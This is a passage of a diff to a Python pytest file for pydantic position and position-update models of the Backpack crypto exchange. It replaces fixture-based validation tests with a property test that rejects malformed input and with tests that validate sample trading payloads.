-        assert field in str(validation_exc_info.value) or expected_msg_part in str(
-            validation_exc_info.value
-        ), f"Field: {field}, Value: {value!r}, Error: {validation_exc_info.value}"
+    )
+    def test_position_models_security_boundary_properties(
+        self, malicious_data: dict[str, Any]
+    ) -> None:
+        """Property: Both position models should consistently reject malicious inputs."""
+        # Try to validate as position response if it has response fields
+        if (
+            "symbol" in malicious_data
+            or "positionId" in malicious_data
+            or "breakEvenPrice" in malicious_data
+        ):
+            position_data = {
+                "breakEvenPrice": malicious_data.get("breakEvenPrice", "20000.50"),
+                "entryPrice": "19800.00",
+                "estLiquidationPrice": "15000.00",
+                "imf": "0.1234",
+                "imfFunction": {"base": "0.1", "factor": "0.5"},
+                "markPrice": "20100.75",
+                "mmf": "0.0678",
+                "mmfFunction": {"base": "0.05", "factor": "0.25"},
+                "netCost": "-1980.00",
+                "netQuantity": malicious_data.get("netQuantity", "0.1"),
+                "netExposureQuantity": "0.1",
+                "netExposureNotional": "2010.075",
+                "pnlRealized": "5.00",
+                "pnlUnrealized": "30.075",
+                "cumulativeFundingPayment": "-1.25",
+                "symbol": malicious_data.get("symbol", "BTC_USDC"),
+                "userId": 123456789,
+                "positionId": malicious_data.get("positionId", "pos_abc123"),
+                "cumulativeInterest": "0.0",
+                "subaccountId": 0,
+            }
+
+            # Property: Malicious position data should be rejected
+            with pytest.raises((
+                ValidationError,
+                TypeError,
+                EmptyStringError,
+                TypeFieldError,
+                DecimalFiniteError,
+            )):
+                BackpackRawPositionResponse.model_validate(position_data)
+
+        # Try to validate as position update if it has update fields
+        if "s" in malicious_data or "b" in malicious_data or "q" in malicious_data:
+            update_data = {
+                "e": "positionUpdate",
+                "E": 1678886400000,
+                "s": malicious_data.get("s", "SOL_USDC"),
+                "b": malicious_data.get("b", "22.50"),
+                "B": "22.00",
+                "l": "18.00",
+                "f": "0.05",
+                "M": "23.10",
+                "m": "0.02",
+                "q": malicious_data.get("q", "10.5"),
+                "Q": "10.5",
+                "n": "242.55",
+            }
+
+            # Property: Malicious update data should be rejected
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
+                BackpackRawPositionUpdate.model_validate(update_data)
 
 
-def test_BackpackRawPosition_extra_field(
-    valid_position_data: dict[str, Any],  # Add fixture dependency
-    valid_imf_function_data: dict[str, str],  # Add fixture dependency
-    valid_mmf_function_data: dict[str, str],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPosition extra field."""
-    # Note: valid_position_data fixture already includes imf/mmf data
-    data = valid_position_data  # Use the injected fixture directly
-    data["extraField"] = "some_value"
-    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
-        BackpackRawPositionResponse.model_validate(data)
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
 
 
-def test_BackpackRawPosition_frozen(
-    valid_position_data: dict[str, Any],  # Add fixture dependency
-    valid_imf_function_data: dict[str, str],  # Add fixture dependency
-    valid_mmf_function_data: dict[str, str],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPosition frozen."""
-    # Note: valid_position_data fixture already includes imf/mmf data
-    pos = BackpackRawPositionResponse.model_validate(
-        valid_position_data,
-    )  # Use the injected fixture directly
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        pos.symbol = "new_symbol"
+def test_BackpackRawPositionResponse_real_world_example() -> None:
+    """Test with real-world trading position data."""
+    payload = {
+        "breakEvenPrice": "50125.75",
+        "entryPrice": "50000.00",
+        "estLiquidationPrice": "45000.00",
+        "imf": "0.05",
+        "imfFunction": {"base": "0.03", "factor": "0.02"},
+        "markPrice": "50250.50",
+        "mmf": "0.025",
+        "mmfFunction": {"base": "0.015", "factor": "0.01"},
+        "netCost": "-500.00",
+        "netQuantity": "0.01",
+        "netExposureQuantity": "0.01",
+        "netExposureNotional": "502.505",
+        "pnlRealized": "0.00",
+        "pnlUnrealized": "2.505",
+        "cumulativeFundingPayment": "-0.125",
+        "symbol": "BTC_USDC",
+        "userId": 987654321,
+        "positionId": "pos_btc_123456",
+        "cumulativeInterest": "0.0",
+        "subaccountId": 1,
+    }
+    obj = BackpackRawPositionResponse.model_validate(payload)
+    assert obj.symbol == "BTC_USDC"
+    assert obj.break_even_price == "50125.75"
+    assert obj.net_quantity == "0.01"
+    assert obj.pnl_unrealized == "2.505"
 
 
-# --- Success Cases: BackpackRawPositionUpdate ---
-
-
-def test_BackpackRawPositionUpdate_valid(valid_position_update_data: dict[str, Any]) -> None:
-    """Test BackpackRawPositionUpdate valid."""
-    update = BackpackRawPositionUpdate.model_validate(valid_position_update_data)
-    assert update.event_type == "positionUpdate"
-    assert update.event_time == 1678886400000
-    assert update.symbol == "SOL_USDC"
-    assert update.break_event_price == "22.50"
-    assert update.entry_price == "22.00"
-    assert update.liquidation_price == "18.00"
-    assert update.initial_margin_fraction == "0.05"
-    assert update.mark_price == "23.10"
-    assert update.maintenance_margin_fraction == "0.02"
-    assert update.net_quantity == "10.5"
-    assert update.net_exposure_quantity == "10.5"
-    assert update.net_exposure_notional == "242.55"
-    assert update.model_config.get("extra") == "forbid"
-    assert update.model_config.get("frozen") is True
-
-
-def test_BackpackRawPositionUpdate_valid_optional_fields_none(
-    valid_position_update_data: dict[str, Any],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPositionUpdate valid optional fields none."""
-    data = valid_position_update_data  # Use the injected fixture directly
-    # Set all optional fields to None
-    optional_fields = ["b", "B", "l", "f", "M", "m", "q", "Q", "n"]
-    for key in optional_fields:
-        data[key] = None
-
-    update = BackpackRawPositionUpdate.model_validate(data)
-    assert update.break_event_price is None
-    assert update.entry_price is None
-    assert update.liquidation_price is None
-    assert update.initial_margin_fraction is None
-    assert update.mark_price is None
-    assert update.maintenance_margin_fraction is None
-    assert update.net_quantity is None
-    assert update.net_exposure_quantity is None
-    assert update.net_exposure_notional is None
-
-
-def test_BackpackRawPositionUpdate_valid_timestamp_formats(
-    valid_position_update_data: dict[str, Any],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPositionUpdate valid timestamp formats."""
-    data = valid_position_update_data  # Use the injected fixture directly
-    data["E"] = "2023-03-15T12:00:00Z"
-    update = BackpackRawPositionUpdate.model_validate(data)
-    assert update.event_time == "2023-03-15T12:00:00Z"
-
-    # Reset data for next case
-    data = valid_position_update_data  # Use the injected fixture directly
-    data["E"] = 1678886400.500  # Float seconds
-    update = BackpackRawPositionUpdate.model_validate(data)
-    assert update.event_time == 1678886400.500
-
-    # Reset data for next case
-    data = valid_position_update_data  # Use the injected fixture directly
-    data["E"] = "1678886400000"  # String ms
-    update = BackpackRawPositionUpdate.model_validate(data)
-    assert update.event_time == 1678886400000
-
-    # Reset data for next case
-    data = valid_position_update_data  # Use the injected fixture directly
-    data["E"] = None
-    update = BackpackRawPositionUpdate.model_validate(data)
-    assert update.event_time is None
-
-
-# --- Failure Cases: BackpackRawPositionUpdate ---
-
-
-@pytest.mark.parametrize(
-    ("field", "value", "expected_msg_part"),
-    [
-        ("e", "wrongUpdate", "Invalid value"),  # Wrong event type
-        ("e", "", "String cannot be empty"),
-        ("E", "not-a-date", "Cannot parse as ISO datetime"),
-        ("E", [], "Invalid int/float/str timestamp value"),
-        ("s", "", "String cannot be empty"),
-        ("s", None, "Field required"),
-        ("b", "inf", "finite decimal"),  # break_event_price
-        ("B", "nan", "finite decimal"),  # entry_price
-        ("l", "", "String cannot be empty"),  # liquidation_price
-        ("f", "  ", "String cannot be empty"),  # initial_margin_fraction
-        ("M", "1.2.3", "finite decimal"),  # mark_price
-        ("m", True, "Expected string"),  # maintenance_margin_fraction
-        ("q", [], "Expected string"),  # net_quantity
-        ("Q", "infinity", "finite decimal"),  # net_exposure_quantity
-        ("n", "NaN", "finite decimal"),  # net_exposure_notional
-    ],
-)
-def test_BackpackRawPositionUpdate_invalid_fields(
-    field: str,
-    value: str | float | bool | list[Any] | None,  # Invalid types for Pydantic
-    expected_msg_part: str,
-    valid_position_update_data: dict[str, Any],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPositionUpdate invalid fields."""
-    data = valid_position_update_data  # Use the injected fixture directly
-    data[field] = value
-
-    # Different exceptions are raised based on the specific validation failure
-    type_error_cases = [
-        field == "s" and value is None,
-        field == "m" and value is True,
-        field == "q" and value == [],
-    ]
-    empty_string_cases = [
-        # Note: field 'e' has Literal constraint, so empty string raises ValidationError
-        # not EmptyStringError
-        field == "s" and not value,
-        field == "l" and not value,
-        field == "f" and value == "  ",
-    ]
-    datetime_error_cases = [
-        field == "E" and value == "not-a-date",
-    ]
-    timestamp_format_error_cases = [
-        field == "E" and value == [],
-    ]
-
-    if any(type_error_cases):
-        with pytest.raises(TypeError) as type_exc_info:
-            BackpackRawPositionUpdate.model_validate(data)
-        # For TypeError cases, just verify we got the expected exception type
-        # since field validation order may vary
-        assert isinstance(type_exc_info.value, TypeError)
-    elif any(empty_string_cases):
-        with pytest.raises(EmptyStringError) as empty_exc_info:
-            BackpackRawPositionUpdate.model_validate(data)
-        # Check if the expected message part is present
-        assert expected_msg_part in str(empty_exc_info.value), (
-            f"Field: {field}, Value: {value!r}, Error: {empty_exc_info.value}"
-        )
-    elif any(datetime_error_cases):
-        with pytest.raises(DateTimeParsingError) as datetime_exc_info:
-            BackpackRawPositionUpdate.model_validate(data)
-        # Check if the expected message part is present
-        assert expected_msg_part in str(datetime_exc_info.value), (
-            f"Field: {field}, Value: {value!r}, Error: {datetime_exc_info.value}"
-        )
-    elif any(timestamp_format_error_cases):
-        with pytest.raises(TimestampFormatError) as timestamp_exc_info:
-            BackpackRawPositionUpdate.model_validate(data)
-        # Check if the expected message part is present
-        assert expected_msg_part in str(timestamp_exc_info.value), (
-            f"Field: {field}, Value: {value!r}, Error: {timestamp_exc_info.value}"
-        )
-    else:
-        with pytest.raises(ValidationError) as validation_exc_info:
-            BackpackRawPositionUpdate.model_validate(data)
-        assert expected_msg_part in str(validation_exc_info.value) or field in str(
-            validation_exc_info.value
-        ), f"Field: {field}, Value: {value!r}, Error: {validation_exc_info.value}"
-
-
-def test_BackpackRawPositionUpdate_extra_field(
-    valid_position_update_data: dict[str, Any],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPositionUpdate extra field."""
-    data = valid_position_update_data  # Use the injected fixture directly
-    data["extra"] = 123
-    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
-        BackpackRawPositionUpdate.model_validate(data)
-
-
-def test_BackpackRawPositionUpdate_frozen(
-    valid_position_update_data: dict[str, Any],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPositionUpdate frozen."""
-    data = valid_position_update_data  # Use the injected fixture directly
-    pos_update = BackpackRawPositionUpdate.model_validate(data)
-    with pytest.raises(ValidationError, match="Instance is frozen"):
-        pos_update.symbol = "NEW_SYMBOL"
-
-
-class TestBackpackRawPositionResponse:
-    """Tests for the BackpackRawPositionResponse model that might involve more complex validation.
-
-    Tests scenarios not covered by simple field-level parametrization.
-    """
-
-    def test_invalid_position_bad_side(self) -> None:
-        """Test that an order with an invalid side raises ValidationError."""
-        # This test's logic will be determined if it fails after unmarking.
-        # For now, just ensuring the decorator is removed and the class structure remains.
-        # If BackpackRawPositionResponse infers side from quantity, this test might relate to
-        # validating that relationship or handling impossible raw states.
-        # Placeholder, actual test logic might be present or added if it fails.
+def test_BackpackRawPositionUpdate_real_world_example() -> None:
+    """Test with real-world position update event data."""
+    payload = {
+        "e": "positionUpdate",
+        "E": 1678886400000,
+        "s": "ETH_USDC",
+        "b": "1650.25",
+        "B": "1640.00",
+        "l": "1500.00",
+        "f": "0.1",
+        "M": "1655.75",
+        "m": "0.05",
+        "q": "1.5",
+        "Q": "1.5",
+        "n": "2483.625",
+    }
+    obj = BackpackRawPositionUpdate.model_validate(payload)
+    assert obj.event_type == "positionUpdate"
+    assert obj.symbol == "ETH_USDC"
+    assert obj.break_event_price == "1650.25"
+    assert obj.net_quantity == "1.5"
